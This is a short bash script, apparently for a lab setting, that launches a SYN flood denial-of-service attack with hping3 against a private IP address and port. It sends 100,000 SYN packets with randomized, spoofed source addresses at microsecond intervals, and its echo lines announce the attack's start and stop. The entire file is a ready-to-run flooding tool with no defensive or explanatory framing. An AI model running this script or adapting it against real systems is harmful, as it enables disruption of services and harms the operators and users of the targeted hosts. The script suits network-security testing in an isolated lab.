#!/bin/bash

SERVER_IP="192.168.64.2"
SERVER_PORT=12345

echo "Starting SYN flood attack..."
hping3 -S -p $SERVER_PORT -i u1000 $SERVER_IP --rand-source -c 100000
echo "SYN flood attack stopped."
